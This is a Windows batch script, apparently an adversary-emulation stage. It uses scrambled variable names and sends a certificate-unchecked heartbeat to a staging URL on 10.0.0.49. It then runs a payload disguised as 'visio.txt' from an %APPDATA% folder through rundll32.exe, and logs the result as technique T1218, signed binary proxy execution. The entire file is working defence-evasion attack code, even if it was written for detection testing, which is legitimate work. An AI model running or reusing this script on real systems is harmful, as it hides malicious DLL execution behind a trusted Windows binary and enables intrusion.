@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\9717\59dd288c
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?9717-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=visio.txt
SET rgnpbq=9717
SET vplog=%APPDATA%\!fkesh!\macula-simulations.log
SET tsvar=!DATE!/!TIME!
SET mqnw=0
SET jwqcx=

echo [!tsvar!][DEBUG][!eykalkg!]: script_start>> "!vplog!" 2>nul
echo [!tsvar!][DEBUG][!eykalkg!]: heartbeat_start>> "!vplog!" 2>nul
curl -k -s -o nul "!frytcn!"
IF !ERRORLEVEL! EQU 0 (
  SET mqnw=1
  echo [!tsvar!][DEBUG][!eykalkg!]: heartbeat_complete>> "!vplog!" 2>nul
) ELSE (
  SET jwqcx=heartbeat_failed
  echo [!tsvar!][DEBUG][!eykalkg!]: heartbeat_failed>> "!vplog!" 2>nul
)

SET zkysc=1
SET qnwdx=
echo [!tsvar!][DEBUG][!eykalkg!]: chdir_start>> "!vplog!" 2>nul
cd /d "!douyiw!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
  SET zkysc=0
  SET qnwdx=chdir_failed
)
echo [!tsvar!][DEBUG][!eykalkg!]: chdir_result=!zkysc!>> "!vplog!" 2>nul

SET rwdjk=1
SET jcldd=
IF !zkysc! EQU 1 (
  echo [!tsvar!][DEBUG][!eykalkg!]: rundll32_start>> "!vplog!" 2>nul
  rundll32.exe !ecrfwq!,DllMain
  IF !ERRORLEVEL! NEQ 0 (
    SET rwdjk=0
    SET jcldd=dll_load_failed
    echo [!tsvar!][DEBUG][!eykalkg!]: rundll32_failed>> "!vplog!" 2>nul
  ) ELSE (
    echo [!tsvar!][DEBUG][!eykalkg!]: rundll32_complete>> "!vplog!" 2>nul
  )
) ELSE (
  SET rwdjk=0
  SET jcldd=!qnwdx!
)

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][!eykalkg!]: !fkesh!-!rgnpbq!-T1218|Signed Binary Proxy Execution=!rwdjk!:!jcldd!>> "!vplog!" 2>nul
echo [!tsvar!][DEBUG][!eykalkg!]: script_complete>> "!vplog!" 2>nul